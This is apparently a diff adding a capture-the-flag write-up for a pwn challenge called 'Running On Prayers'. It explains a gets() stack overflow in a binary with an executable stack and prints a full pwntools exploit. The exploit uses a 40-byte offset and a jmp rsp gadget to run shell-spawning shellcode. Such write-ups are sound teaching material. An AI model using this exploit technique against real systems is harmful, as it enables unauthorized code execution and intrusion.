@@ -596,4 +596,138 @@ Flag: jctf{62881624049}
 ####  Running On Prayers 
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/337899cc-acf9-42a7-b2b3-247a21c5df83)
 
+After downloading the binary I checked the file type and protections enabled on it
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/39741e3d-8a2e-4edc-99c0-f7dacde9c7fe)
+
+We are working with a 64bits binary that's not stripped and dynamically linked
+
+From the result of `checksec` we can see that no binary protection are enabled and the stack is rwx(readable-writable-executable)
+
+Loading the binary up in Ghidra here's the main function
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8aaf8c6f-f727-4978-b180-b267faac0a73)
+
+It just does some `setvbuf` calls then proceeds to calling the `vuln` function
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/954566d9-3f63-4208-9695-3cfb541d00a5)
+
+```c
+undefined8 vuln(void)
+
+{
+  char buffer [32];
+  
+  printf("The hard part is not finding the vulnerability, but actually doing something with it");
+  gets(buffer);
+  return 0;
+}
+```
+
+So we have relatively simple program here which defines a buffer that can hold up at most 32 bytes then receive our input which is stored to the buffer using `gets()`
+
+The usage of `gets` leads to a buffer overflow
+
+Now what do we do with this?
+
+First I decided to get the number of bytes required to overwrite the instruction pointer
+
+We can easily do that with `gdb-gef`
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a86b6293-be75-493a-a11a-1b984bbad5e5)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5eeebb22-f9ba-4ba9-9157-c9b436d6eb0a)
+
+So it's 40!
+
+Now it's exploitation time.... I used `ropper` to get the list of available gadgets and found an interesting one
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/42163eaf-3452-4c9b-b6ea-cd12e37ed554)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/41de944d-31f5-44f9-9e25-602108e5bf1f)
+
+That instruction would basically jump to the current value in the stack pointer
+
+And because we have unbounded overflow our input would basically be on the stack
+
+Remember that the stack is executable that means we can place a shellcode there and then when we jump to it, the shellcode would get executed
+
+Here's my exploit [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/new-jersey24/pwn/running-on-prayers/solve.py)
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+
+exe = context.binary = ELF('RunningOnPrayers')
+filterwarnings("ignore")
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+break *vuln+55
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
+
+def solve():
+    jmp_rsp = 0x0000000000401231 # jmp rsp; 
+    offset = 40
+
+    sc = asm(shellcraft.sh())
+
+    payload = b'A'*offset + p64(jmp_rsp) + sc
+
+    sleep(60)
+    io.sendline(payload)
+
+    io.interactive()
+
+def main():
+    
+    init()
+    solve()
+    
+if __name__ == '__main__':
+    main()
+```
+
+Running it works
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7c0f91e4-f003-439c-bfdb-8e8e32ebc6a6)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5fa54190-b174-4eae-9378-28412b3d032b)
+
+```
+Flag: jctf{Really_Obvious_Problem}
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
